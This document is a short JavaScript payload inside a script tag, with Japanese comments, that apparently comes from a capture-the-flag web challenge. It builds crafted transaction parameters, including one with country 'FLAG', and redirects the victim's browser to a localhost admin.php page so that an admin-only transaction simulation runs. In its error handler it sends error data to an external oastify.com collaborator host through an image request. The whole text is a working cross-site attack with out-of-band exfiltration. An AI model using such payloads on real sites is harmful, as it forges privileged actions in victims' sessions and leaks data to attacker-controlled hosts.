<script>
      (async () => {
    try {
      // transactions配列をURLパラメータとして構築
      const transactions = [
        {amount: 1000001, country: 'ZZ', op: 'BUY'},
        {amount: 1000001, country: 'ZZ', op: 'SELL'},
        {amount: 1, country: 'FLAG', op: 'BUY'}
      ];

      let params = '';
      transactions.forEach((tx, i) => {
        params += `transactions[${i}][amount]=${tx.amount}&`;
        params += `transactions[${i}][country]=${tx.country}&`;
      });

      // GETリクエストでsimulate_transactions()を実行
      window.location.href = `http://localhost:5000/admin.php?${params.slice(0, -1)}`;

    } catch (e) {
      new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
    }
  })();
</script>
